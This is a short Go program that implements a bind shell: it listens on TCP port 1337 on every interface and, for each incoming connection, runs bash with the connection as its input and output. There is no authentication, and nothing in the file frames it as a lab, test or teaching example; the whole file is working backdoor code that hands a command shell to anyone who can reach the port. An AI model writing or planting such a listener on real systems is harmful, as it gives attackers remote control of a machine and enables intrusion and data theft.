package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	defer conn.Close()
	cmd := exec.Command("bash")
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
}

func main() {
	listener, err := net.Listen("tcp", ":1337")
	if err != nil {
		log.Fatalln(err)
	}

	// If available connection accept and handle
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
